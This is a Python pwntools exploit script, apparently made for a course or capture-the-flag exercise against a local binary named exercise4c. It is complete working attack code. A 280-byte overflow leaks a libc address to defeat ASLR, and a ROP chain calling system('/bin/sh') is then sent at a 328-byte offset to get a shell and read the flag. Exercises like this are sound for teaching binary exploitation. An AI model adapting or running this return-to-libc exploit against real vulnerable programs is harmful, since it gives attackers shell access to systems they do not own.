#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise4/exercise4c'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

r.recvline()
r.sendline(b'A'*280) 
recv = r.recv()
setvbuf_addr = u64(recv[4+280:4+280+6].ljust(8, b'\x00')) - 261
offset = setvbuf_addr - libc.symbols['setvbuf']
libc.address = libc.address + offset
rop = ROP(libc)

rop.raw(rop.find_gadget(["ret"]))
rop.system(next(libc.search(b'/bin/sh\x00')))
payload = b'A' * 328 + bytes(rop)
# r.sendlineafter(b'you want to send:', payload)
r.sendline(payload)
r.sendline(b'cat flag; exit')
print(r.recvall(timeout=1))